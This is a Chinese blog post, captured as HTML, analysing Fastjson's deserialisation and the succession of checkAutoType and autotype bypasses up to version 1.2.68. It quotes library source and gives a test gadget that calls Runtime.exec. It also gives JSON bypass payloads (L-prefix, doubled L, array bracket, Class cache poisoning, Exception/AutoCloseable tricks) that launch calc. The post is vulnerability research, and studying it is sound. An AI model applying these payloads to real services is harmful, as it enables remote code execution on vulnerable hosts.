@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Fastjson反序列化机制和autotype观测 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期日, 八月 23日 2020, 8:50 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    4.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      21 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 只知道 Fastjson 的大致反序列化机制，所以打算以两个 autotype 绕过漏洞为基础深入读一读源码。</p>
+<p>其实 Fastjson 反序列化漏洞的利用限制还是有的，除了对 Fastjson 本身的版本有要求，还对其他依赖、JDK 版本等有要求，因为 Java 中能实现 RCE 的方法其实不多：反射、JNDI、TemplatesImpl 等。</p>
+<a id="more"></a>
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的是 SpringBoot 搭建 web 服务，然后 maven 下载 Fastjson 依赖，再写一个方便测试的类（因为 JDK 版本较高，JNDI 无法触发）：</p>
+<pre><code class="java">package com.example.json.evil;
+
+import java.io.IOException;
+
+public class Evil {
+    public void setCmd(String cmd) throws IOException {
+        Runtime.getRuntime().exec(cmd);
+    }
+}
+</code></pre>
+<p>为了复现黑名单绕过，还需要手动加入黑名单：</p>
+<pre><code class="java">ParserConfig.getGlobalInstance().addDeny(&quot;com.example.json.evil&quot;);
+</code></pre>
+<h3 id="Fastjson-反序列化漏洞"><a href="#Fastjson-反序列化漏洞" class="headerlink" title="Fastjson 反序列化漏洞"></a>Fastjson 反序列化漏洞</h3><p>因为要反序列化成对象，所以给其属性赋值的时候，在私有属性等情况下，就需要访问他们的 getter 和 setter。</p>
+<p>而如果这些 getter 和 setter 中存在危险操作，就会导致漏洞。</p>
+<h3 id="autotype"><a href="#autotype" class="headerlink" title="autotype"></a>autotype</h3><p>autotype 是 Fastjson 中的一个重要机制，粗略来说就是用于设置能否将 JSON 反序列化成对象。</p>
+<p>但是其实从源码实现来看，即使没有开启 autoype，也有一些情况下是可以反序列化出对象来的，具体的情况在后面再分析。</p>
+<h3 id="远古版本-Fastjson-lt-1-2-10"><a href="#远古版本-Fastjson-lt-1-2-10" class="headerlink" title="远古版本 Fastjson &lt; 1.2.10"></a>远古版本 Fastjson &lt; 1.2.10</h3><p>autotype 默认开启，没有反序列化黑名单。</p>
+<h3 id="Fastjson-lt-1-2-25"><a href="#Fastjson-lt-1-2-25" class="headerlink" title="Fastjson &lt; 1.2.25"></a>Fastjson &lt; 1.2.25</h3><p>autotype 默认开启，反序列化黑名单中只有一个不是用于漏洞利用的类 java.lang.Thread，可以为所欲为。</p>
+<h3 id="Fastjson-1-2-25"><a href="#Fastjson-1-2-25" class="headerlink" title="Fastjson 1.2.25"></a>Fastjson 1.2.25</h3><p>autotype 默认关闭，增加了 checkAutoType 函数，反序列化对象之前要经过 checkAutoType 函数的检验。</p>
+<p>而且增加了白名单和黑名单，以白名单优先级最高，白名单如果允许就不检测黑名单与危险类，否则继续检测黑名单与危险类。</p>
+<h3 id="1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-黑名单绕过"><a href="#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-黑名单绕过" class="headerlink" title="1.2.25 &lt;=  Fastjson  &lt;=  1.2.41 checkAutoType 黑名单绕过"></a>1.2.25 &lt;=  Fastjson  &lt;=  1.2.41 checkAutoType 黑名单绕过</h3><p>不断地增加黑名单，还有某些逻辑漏洞的修复。</p>
+<p>这期间发生了一次 checkAutoType 黑名单绕过，我们先来看看 1.2.41 版本下 checkAutoType 的黑名单校验：</p>
+<pre><code class="java">if (autoTypeSupport || expectClass != null) {
+    for (int i = 0; i &lt; acceptList.length; ++i) {
+        String accept = acceptList[i];
+        if (className.startsWith(accept)) {
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+            if (clazz != null) {
+                    return clazz;
+            }
+        }
+    }
+
+    for (int i = 0; i &lt; denyList.length; ++i) {
+        String deny = denyList[i];
+        if (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+    }
+}
+</code></pre>
+<p>可以看到对类名的校验用的是 startsWith，所以只要在前面加一些不会影响到类加载的字符就能绕过黑名单的校验。</p>
+<p>而往下看到加载类时使用的 TypeUtils.loadClass 函数：</p>
+<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
+    if(className == null || className.length() == 0){
+        return null;
+    }
+    Class&lt;?&gt; clazz = mappings.get(className);
+    if(clazz != null){
+        return clazz;
+    }
+    if(className.charAt(0) == &#39;[&#39;){
+        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+        return Array.newInstance(componentType, 0).getClass();
+    }
+    if(className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)){
+        String newClassName = className.substring(1, className.length() - 1);
+        return loadClass(newClassName, classLoader);
+    }
+    ...
+}
+</code></pre>
+<p>可以看到当类名以 L 开头以 ; 结尾时，会将这两个字符去掉然后重新调用 loadClass 进行加载，所以不会影响类的加载。</p>
+<p>而在类名前面加上 L 之后就不会触发 startsWith 的校验，也就绕过了黑名单，例如：</p>
+<pre><code class="json">{&quot;@type&quot;:&quot;Lcom.example.json.evil.Evil;&quot;,&quot;cmd&quot;:&quot;calc&quot;}
+</code></pre>
+<p>至于为什么会有这种奇怪的处理，L 和 ; 这一对字符其实是 JVM 字节码中用来表示类名的：<a href="https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.3" target="_blank" rel="noopener">https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.3</a> ，Fastjson 对这种类名的表达方式也做了处理。</p>
+<h3 id="Fastjson-1-2-42-checkAutoType-黑名单绕过"><a href="#Fastjson-1-2-42-checkAutoType-黑名单绕过" class="headerlink" title="Fastjson 1.2.42 checkAutoType 黑名单绕过"></a>Fastjson 1.2.42 checkAutoType 黑名单绕过</h3><p>黑白名单改成了十进制的 HashCode，无法直观地看出类名包名，想要找出就需要本地有很多依赖然后跑脚本计算 HashCode 了。 </p>
+<p>而与此同时，发生了第二次 checkAutoType 黑名单绕过（其实就是上一次修复不到位），看看 1.2.42 版本下的 checkAutoType 的黑名单校验：</p>
+<pre><code class="java">if ((((BASIC
+       ^ className.charAt(0))
+      * PRIME)
+     ^ className.charAt(className.length() - 1))
+    * PRIME == 0x9198507b5af98f0L)
+{
+    className = className.substring(1, className.length() - 1);
+}
+...
+if (autoTypeSupport || expectClass != null) {
+    long hash = h3;
+    for (int i = 3; i &lt; className.length(); ++i) {
+        hash ^= className.charAt(i);
+        hash *= PRIME;
+        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+            if (clazz != null) {
+                return clazz;
+            }
+        }
+        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+    }
+}
+</code></pre>
+<p>上面一段代码对第一个和最后一个字符做了校验，虽然写成了 hash 的样子让人看不懂，但是调试一遍就能知道这里就是去掉了 L 和 ; 这一对字符，用于修补前面的黑名单绕过。</p>
+<p>但是仔细一思考，他只做了一次去除，那双写不就饶过了吗，例如：</p>
+<pre><code class="json">{&quot;@type&quot;:&quot;LLcom.example.json.evil.Evil;;&quot;,&quot;cmd&quot;:&quot;calc&quot;}
+</code></pre>
+<h3 id="Fastjson-1-2-43-checkAutoType-黑名单绕过"><a href="#Fastjson-1-2-43-checkAutoType-黑名单绕过" class="headerlink" title="Fastjson 1.2.43 checkAutoType 黑名单绕过"></a>Fastjson 1.2.43 checkAutoType 黑名单绕过</h3><p>发生了第三次 checkAutoType 黑名单绕过（跟上一次相比换了个方式），看看 1.2.43 版本下的 checkAutoType，黑名单校验就不看了，没有什么变化，看看对 L 和 ; 绕过的处理：</p>
+<pre><code class="java">if ((((BASIC
+    ^ className.charAt(0))
+    * PRIME)
+    ^ className.charAt(className.length() - 1))
+    * PRIME == 0x9198507b5af98f0L)
+{
+    if ((((BASIC
+        ^ className.charAt(0))
+        * PRIME)
+        ^ className.charAt(1))
+        * PRIME == 0x9195c07b5af5345L)
+    {
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    }
+    // 9195c07b5af5345
+    className = className.substring(1, className.length() - 1);
+}
+</code></pre>
+<p>简单来说就是做了两次套娃校验，看到一对就去掉，看到两对就直接抛出异常，所以 L 和 ; 这对字符已经无法用来绕过了。</p>
+<p>但是除了这对字节码字符，loadClass 还对字节码中的数组，即 [ 做了特殊处理：</p>
+<pre><code class="java">if(className.charAt(0) == &#39;[&#39;){
+    Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+    return Array.newInstance(componentType, 0).getClass();
+}
+</code></pre>
+<p>当序列化数据为一个对象数组的时候，最前面会是一个 L 字符，所以也可以用来绕过，例如：</p>
+<pre><code class="json">{&quot;@type&quot;:&quot;[com.example.json.evil.Evil&quot;[{&quot;cmd&quot;:&quot;calc&quot;}]
+</code></pre>
+<h3 id="Fastjson-1-2-44-checkAutoType-黑名单绕过修复"><a href="#Fastjson-1-2-44-checkAutoType-黑名单绕过修复" class="headerlink" title="Fastjson 1.2.44 checkAutoType 黑名单绕过修复"></a>Fastjson 1.2.44 checkAutoType 黑名单绕过修复</h3><p>合并了对上面提到的绕过方式的修复：</p>
+<pre><code class="java">final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
+if (h1 == 0xaf64164c86024f1aL) { // [
+    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+}
+
+if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
+    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+}
+</code></pre>
+<p>[ 开头或者 L 开头 ; 结尾都会抛出异常，上述的绕过方式都不好使了。</p>
+<h3 id="1-2-44-lt-Fastjson-lt-1-2-46"><a href="#1-2-44-lt-Fastjson-lt-1-2-46" class="headerlink" title="1.2.44 &lt;=  Fastjson  &lt;=  1.2.46"></a>1.2.44 &lt;=  Fastjson  &lt;=  1.2.46</h3><p>增加黑名单。</p>
+<h3 id="Fastjson-1-2-47-autotype-绕过"><a href="#Fastjson-1-2-47-autotype-绕过" class="headerlink" title="Fastjson 1.2.47 autotype 绕过"></a>Fastjson 1.2.47 autotype 绕过</h3><p>这个版本下发生了第一次 autotype 的绕过，在没有开启 autotype 的情况下也可以像远古版本一样为所欲为。</p>
+<p>简单先理一遍 checkAutoType 的处理顺序：</p>
+<ol>
+<li>之前黑名单绕过的修复</li>
+<li>开启 autoTypeSupport 或者 expectClass 不为空时的黑白名单（白名单直接返回）</li>
+<li>尝试从缓存 Map 中加载类，若成功且无 expectClass 时可以直接返回</li>
+<li>尝试从 deserializers 中加载类，若成功且无 expectClass 时可以直接返回</li>
+<li>未开启 autoTypeSupport 时的黑白名单</li>
+<li>加载类</li>
+<li>expectClass 校验和注解校验，如果通过则返回</li>
+<li>未开启 autoTypeSupport 则抛出异常</li>
+</ol>
+<p>我们可以看到，在未开启 autoTypeSupport 时，如果我们能够向缓存 Map 中写入一个恶意类，那我们就可以绕过 autotype 反序列化任意一个类。而在开启 autoTypeSupport 的情况下，反而会被前面的黑名单校验所拦截。</p>
+<p>观察缓存 Map 的写入，可以发现能控制得写入只有 TypeUtils 类得 loadClass 函数一个地方：</p>
+<pre><code class="java">try{
+    if(classLoader != null){
+        clazz = classLoader.loadClass(className);
+        if (cache) {
+            mappings.put(className, clazz);
+        }
+        return clazz;
+    }
+} catch(Throwable e){
+    e.printStackTrace();
+    // skip
+}
+try{
+    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+    if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader){
+        clazz = contextClassLoader.loadClass(className);
+        if (cache) {
+            mappings.put(className, clazz);
+        }
+        return clazz;
+    }
+} catch(Throwable e){
+    // skip
+}
+</code></pre>
+<p>在参数 cache 为 true 的情况下，会对加载的类进行缓存。</p>
+<p>全局搜索 TypeUtils.loadClass 可以看到其他地方的可控类加载操作同样只有一个地方：MiscCodec 类的 deserialze 函数：</p>
+<pre><code class="java">if (clazz == Class.class) {
+    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
+}
+</code></pre>
+<p>这里调用的 loadClass 为：</p>
+<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) {
+    return loadClass(className, classLoader, true);
+}
+</code></pre>
+<p>所以 cache 默认为 true，会将加载到的类加入缓存，以后反序列化的时候就会在黑名单校验之前返回加载的类。加载类本来没有什么问题，因为不会触发 setter 和 getter，但是加入缓存就导致了这次 autotype 的绕过。</p>
+<p>clazz 和 strVal 各是什么数据暂且不提，我们可以看到 MiscCodec 类实现了 ObjectDeserializer 接口，很明显是一个反序列化器。</p>
+<p>观察 parseObject 的调用栈，在 checkAutoType 加载类结束之后，会获取反序列化器然后进行反序列化，将 JSON 中的数据还原到加载到的类中：</p>
+<pre><code class="java">ObjectDeserializer deserializer = config.getDeserializer(clazz);
+Class deserClass = deserializer.getClass();
+if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
+        &amp;&amp; deserClass != JavaBeanDeserializer.class
+        &amp;&amp; deserClass != ThrowableDeserializer.class) {
+    this.setResolveStatus(NONE);
+}
+Object obj = deserializer.deserialze(this, clazz, fieldName);
+return obj;
+</code></pre>
+<p>config.getDeserializer 是从 ParserConfig 中获取的，类与反序列化器的对应关系可以看其 initDeserializers 函数，比如：</p>
+<pre><code class="java">deserializers.put(Class.class, MiscCodec.instance);
+</code></pre>
+<p>如果我们输入的 @type 为 java.lang.Class，我们就可以进入 MiscCodec 类的 deserialze 函数，而同时由于 Class 存在于 deserializers 中，换句话说也可以当作一个特别的白名单类，是可以直接加载的。</p>
+<p>回头看 deserialze 函数，clazz 来自 @type，而 strVal 来自 val，所以：</p>
+<pre><code class="json">{&quot;payload1&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.example.json.evil.Evil&quot;},&quot;payload2&quot;:{&quot;@type&quot;:&quot;com.example.json.evil.Evil&quot;,&quot;cmd&quot;:&quot;calc&quot;}}
+</code></pre>
+<p>至于为什么在 @type 为 java.lang.Class 的情况下会加载 val 中的类，可以从 MiscCodec 这个反序列化器上寻找答案。</p>
+<p>跟一般类中会包含一些属性，所以使用的反序列化器会调用 setter 来进行赋值等操作不同，这个反序列化器中的类比较特殊，我们简单看几个其他的类的反序列化操作：</p>
+<pre><code class="java">if (clazz == UUID.class) {
+    return (T) UUID.fromString(strVal);
+}
+
+if (clazz == URI.class) {
+    return (T) URI.create(strVal);
+}
+
+if (clazz == URL.class) {
+    try {
+        return (T) new URL(strVal);
+    } catch (MalformedURLException e) {
+        throw new JSONException(&quot;create url error&quot;, e);
+    }
+}
+
+if (clazz == Pattern.class) {
+    return (T) Pattern.compile(strVal);
+}
+
+if (clazz == Locale.class) {
+    return (T) TypeUtils.toLocale(strVal);
+}
+
+if (clazz == SimpleDateFormat.class) {
+    SimpleDateFormat dateFormat = new SimpleDateFormat(strVal, lexer.getLocale());
+    dateFormat.setTimeZone(lexer.getTimeZone());
+    return (T) dateFormat;
+}
+</code></pre>
+<p>可以看出，这些类都是 Java 中代表某种信息的类（UUID、URI、时间、地域、类信息等），对于这些类来说，他们的信息在序列化和反序列化中一般通过一个字符串就可以表达（UUID、URI、固定格式的时间地域、类名等），序列化时将这些信息写成字符串，反序列化时通过这个字符串进行还原（Class 要将类名还原成某个具体类的描述对象，所以要加载那个类）。我们观察这个反序列化器的序列化函数 write，可以看到 SimpleDateFormat 类的序列化过程中写入了一个 val 键：</p>
+<pre><code class="java">if (objClass == SimpleDateFormat.class) {
+    String pattern = ((SimpleDateFormat) object).toPattern();
+
+    if (out.isEnabled(SerializerFeature.WriteClassName)) {
+        if (object.getClass() != fieldType) {
+            out.write(&#39;{&#39;);
+            out.writeFieldName(JSON.DEFAULT_TYPE_KEY);
+            serializer.write(object.getClass().getName());
+            out.writeFieldValue(&#39;,&#39;, &quot;val&quot;, pattern);
+            out.write(&#39;}&#39;);
+            return;
+        }
+    }
+
+    strVal = pattern;
+}
+</code></pre>
+<p>而因为这些类都使用同一个反序列化器的反序列化函数，所以为了统一，这些类的反序列化取值就可以从 val 中取。</p>
+<h3 id="Fastjson-1-2-47-autotype-绕过修复"><a href="#Fastjson-1-2-47-autotype-绕过修复" class="headerlink" title="Fastjson 1.2.47 autotype 绕过修复"></a>Fastjson 1.2.47 autotype 绕过修复</h3><p>修改了 MiscCodec 反序列化器处理 Class 的代码：</p>
+<pre><code>if (clazz == Class.class) {
+    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader(), false);
+}
+</code></pre><p>不将该类加入缓存。</p>
+<h3 id="1-2-48-lt-Fastjson-lt-1-2-67"><a href="#1-2-48-lt-Fastjson-lt-1-2-67" class="headerlink" title="1.2.48 &lt;=  Fastjson  &lt;=  1.2.67"></a>1.2.48 &lt;=  Fastjson  &lt;=  1.2.67</h3><p>增加黑名单。</p>
+<h3 id="Fastjson-1-2-67-autotype-绕过"><a href="#Fastjson-1-2-67-autotype-绕过" class="headerlink" title="Fastjson 1.2.67 autotype 绕过"></a>Fastjson 1.2.67 autotype 绕过</h3><p>简单总结一下在 autoTypeSupport 未开启时能加载到并返回的类：</p>
+<ul>
+<li><p>acceptHashCodes 中的数组类型用户白名单，满足条件直接返回：</p>
+<pre><code class="java">(!internalWhite) &amp;&amp; (autoTypeSupport || expectClassFlag)
+</code></pre>
+</li>
+<li><p>TypeUtils.mappings 中的内部白名单类（包括 Exception、UUID 等类），符合 expectClass 才能返回</p>
+</li>
+<li><p>deserializers 中的白名单（包括 Class、String 等基础类），符合 expectClass 才能返回</p>
+</li>
+<li><p>typeMapping 中存在的类（默认为空，相当于一个哈希表类型的用户白名单，可以从一个 typeName 映射到某一个类），符合 expectClass 才能返回</p>
+</li>
+<li><p>internalWhite 中的内部白名单，符合 expectClass 才能返回</p>
+</li>
+<li><p>acceptHashCodes 中的数组类型用户白名单，满足条件直接返回：</p>
+<pre><code class="java">!autoTypeSupport
+</code></pre>
+</li>
+<li><p>加载类要满足条件：</p>
+<pre><code class="java">autoTypeSupport || jsonType || expectClassFlag
+</code></pre>
+<p>返回类要满足条件：</p>
+<pre><code class="java">if (jsonType) {
+    TypeUtils.addMapping(typeName, clazz);
+    return clazz;
+}
+
+if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+    || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+    || javax.sql.RowSet.class.isAssignableFrom(clazz) //
+   ) {
+    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+}
+
+if (expectClass != null) {
+    if (expectClass.isAssignableFrom(clazz)) {
+        TypeUtils.addMapping(typeName, clazz);
+        return clazz;
+    } else {
+        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+    }
+}
+</code></pre>
+</li>
+</ul>
+<p>大致就以上级几种情况，而其中存在利用可能的就更少了，基本上只有最后一条，满足 jsonType 或者 expectClassFlag。</p>
+<p>先看 jsonType：</p>
+<pre><code class="java">String resource = typeName.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;
+if (defaultClassLoader != null) {
+    is = defaultClassLoader.getResourceAsStream(resource);
+} else {
+    is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
+}
+if (is != null) {
+    ClassReader classReader = new ClassReader(is, true);
+    TypeCollector visitor = new TypeCollector(&quot;&lt;clinit&gt;&quot;, new Class[0]);
+    classReader.accept(visitor);
+    jsonType = visitor.hasJsonType();
+}
+</code></pre>
+<p>其实就是判断该类中是否有 JSONType 注解，存在该注解的类可以在 autoTypeSupport 未开启的情况下反序列化。这种做法很好理解，因为有这个注解的类，肯定是用户自己实现的可以进行 JSON 序列化反序列化的类，属于可以信任的白名单类，所以这个也不可控了。</p>
+<p>再看 expectClassFlag，这个版本的 checkAutoType 中的 expectClassFlag 实际上是个 expectClass 的黑名单一样的东西：</p>
+<pre><code class="java">final boolean expectClassFlag;
+if (expectClass == null) {
+    expectClassFlag = false;
+} else {
+    if (expectClass == Object.class
+            || expectClass == Serializable.class
+            || expectClass == Cloneable.class
+            || expectClass == Closeable.class
+            || expectClass == EventListener.class
+            || expectClass == Iterable.class
+            || expectClass == Collection.class
+        ) {
+        expectClassFlag = false;
+    } else {
+        expectClassFlag = true;
+    }
+}
+</code></pre>
+<p>当 expectClassFlag 为 true 时，可以在未开启 autoTypeSupport 的情况下加载类。</p>
+<p>我们都知道 expectClass 可以来自 parseObject 解析函数的第二个参数，但是这个参数是不可控的，我们还需要寻找其他地方输入的 expectClass 才有可能实现绕过。</p>
+<p>全局搜索 checkAutoType 的调用，且第二个参数不为 null，可以找到三处调用，第一处位于 ThrowableDeserializer 的 deserialze 函数：</p>
+<pre><code class="java">if (JSON.DEFAULT_TYPE_KEY.equals(key)) {
+    if (lexer.token() == JSONToken.LITERAL_STRING) {
+        String exClassName = lexer.stringVal();
+        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());
+    } else {
+        throw new JSONException(&quot;syntax error&quot;);
+    }
+    lexer.nextToken(JSONToken.COMMA);
+}
+</code></pre>
+<p>可以看到我们可以通过指定第二个 @type 来触发这里的 checkAutoType（第一个 @type 用于获取该反序列化器）。</p>
+<p>我们再看看如何进入 ThrowableDeserializer 这个反序列化器，代码在 ParserConfig 类的 getDeserializer 函数：</p>
+<pre><code class="java">else if (Throwable.class.isAssignableFrom(clazz)) {
+    deserializer = new ThrowableDeserializer(this, clazz);
+} 
+...
+else {
+    deserializer = createJavaBeanDeserializer(clazz, type);
+}
+</code></pre>
+<p>可以看到第一个 @type 需要为 Throwable 的子类，翻一翻 TypeUtils.mappings，里面正好有一个类 Exception，所以可以用这个类作为跳板完成攻击，例如：</p>
+<pre><code class="json">{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.example.json.evil.Evil&quot;,&quot;cmd&quot;:&quot;calc&quot;}
+</code></pre>
+<p>因为传入了 expectClass，所以第二个类也需要是 Throwable 的子类，我这里给测试类继承了 Exception。</p>
+<p>第二处位于 JavaBeanDeserializer 类的 deserialzeArrayMapping 函数，要进入这个反序列化器就需要在调用 getDeserializer 获取反序列化器的时候不满足所有条件，进入到最后的 createJavaBeanDeserializer 函数调用中，翻一翻，里面也正好有一个接口 AutoCloseable 可以利用。再看怎么进入 deserialzeArrayMapping 函数，在 deserialze 函数中：</p>
+<pre><code class="java">if (token == JSONToken.LBRACKET) {
+    final int mask = Feature.SupportArrayToBean.mask;
+    boolean isSupportArrayToBean = (beanInfo.parserFeatures &amp; mask) != 0 //
+                                    || lexer.isEnabled(Feature.SupportArrayToBean) //
+                                    || (features &amp; mask) != 0
+                                    ;
+    if (isSupportArrayToBean) {
+        return deserialzeArrayMapping(parser, type, fieldName, object);
+    }
+}
+</code></pre>
+<p>需要一个中括号，还需要 isSupportArrayToBean 为 true，而这个变量需要 parseObject 解析时传入一个 Feature.SupportArrayToBean 参数，或者写入注解：<a href="https://www.ctolib.com/docs-FastJson-c-fastjson-beantoarray.html" target="_blank" rel="noopener">https://www.ctolib.com/docs-FastJson-c-fastjson-beantoarray.html</a> ，所以这条路是走不通的。</p>
+<p>第三处位于 JavaBeanDeserializer 类的 deserialze 函数：</p>
+<pre><code class="java">if ((typeKey != null &amp;&amp; typeKey.equals(key))
+    || JSON.DEFAULT_TYPE_KEY == key) {
+    lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);
+    if (lexer.token() == JSONToken.LITERAL_STRING) {
+        String typeName = lexer.stringVal();
+        lexer.nextToken(JSONToken.COMMA);
+
+        if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
+            if (lexer.token() == JSONToken.RBRACE) {
+                lexer.nextToken();
+                break;
+            }
+            continue;
+        }
+
+
+        ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
+        Class&lt;?&gt; userType = null;
+
+        if (deserializer == null) {
+            Class&lt;?&gt; expectClass = TypeUtils.getClass(type);
+            userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
+            deserializer = parser.getConfig().getDeserializer(userType);
+        }
+        ...
+    }
+}
+</code></pre>
+<p>跟 Throwable 的一样，需要两个 @type，第二个同样需要实现 AutoCloseable 接口，例如：</p>
+<pre><code class="json">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.example.json.evil.Evil&quot;,&quot;cmd&quot;:&quot;calc&quot;}
+</code></pre>
+<p>至于为什么 expectClass 可以绕过 autotype，因为 expectClass 也是一种用户白名单，这次的问题在于内部可使用的 expectClass 子类较多，里面存在可以利用的危险类。</p>
+<h3 id="Fastjson-1-2-68-autotype-绕过修复"><a href="#Fastjson-1-2-68-autotype-绕过修复" class="headerlink" title="Fastjson 1.2.68 autotype 绕过修复"></a>Fastjson 1.2.68 autotype 绕过修复</h3><p>加入了 safemode，当 safemode 开启时，checkAutoType 会直接抛出异常：</p>
+<pre><code class="java">final int safeModeMask = Feature.SafeMode.mask;
+boolean safeMode = this.safeMode
+    || (features &amp; safeModeMask) != 0
+    || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != 0;
+if (safeMode) {
